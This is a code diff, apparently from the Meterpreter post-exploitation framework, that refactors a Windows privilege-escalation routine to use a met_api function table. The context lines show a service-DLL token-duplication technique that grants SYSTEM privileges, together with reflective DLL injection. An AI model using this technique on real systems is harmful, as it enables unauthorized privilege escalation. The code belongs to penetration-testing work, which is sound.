@@ -1,4 +1,5 @@
 #include "precomp.h"
+#include "common_metapi.h"
 #include "tokendup.h"
 #include "../../../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
 
@@ -89,9 +90,9 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 		if ( os.dwMajorVersion == 4 && os.dwMinorVersion == 0 )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_debug: Not yet supported on this platform.", ERROR_BAD_ENVIRONMENT )
 
-		cpServiceName   = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_NAME );
-		dwServiceLength = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH );
-		lpServiceBuffer = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_DLL );
+		cpServiceName   = met_api->packet.get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_NAME );
+		dwServiceLength = met_api->packet.get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH );
+		lpServiceBuffer = met_api->packet.get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_DLL );
 
 		if( !dwServiceLength || !lpServiceBuffer )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_debug. invalid arguments", ERROR_BAD_ARGUMENTS );
@@ -173,7 +174,7 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 
 						if( DuplicateToken( hToken, SecurityImpersonation, &hTokenDup ) )
 						{
-							core_update_thread_token( remote, hTokenDup );
+							met_api->thread.update_token( remote, hTokenDup );
 							dwResult = ERROR_SUCCESS;
 							break;
 						}
